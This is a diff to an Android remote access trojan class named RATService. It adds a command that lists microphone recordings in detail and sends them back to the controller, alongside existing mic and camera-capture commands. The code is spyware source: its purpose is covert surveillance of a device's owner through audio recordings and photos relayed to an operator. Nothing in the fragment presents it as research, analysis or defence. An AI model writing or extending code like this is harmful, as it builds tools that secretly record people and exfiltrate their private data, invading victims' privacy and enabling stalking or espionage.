@@ -574,6 +574,21 @@ public class RATService extends Service {
         sendCommand("MIC_PATH|ERROR: Mic module not available");
     }
     break;
+       case "mic_list_detailed":
+    if (micModule != null) {
+        String result = micModule.listRecordingsDetailed();
+        try {
+            JSONObject jsonResponse = new JSONObject(result);
+            jsonResponse.put("command", "mic_response");
+            jsonResponse.put("action", "list_recordings_detailed");
+            sendCommand(jsonResponse.toString());
+        } catch (JSONException e) {
+            sendCommand("MIC_LIST|" + result);
+        }
+    } else {
+        sendCommand("MIC_LIST|ERROR: Mic module not available");
+    }
+    break;         
             // Camera commands - Updated to match working project format
             case "take_photo":
             case "camera":
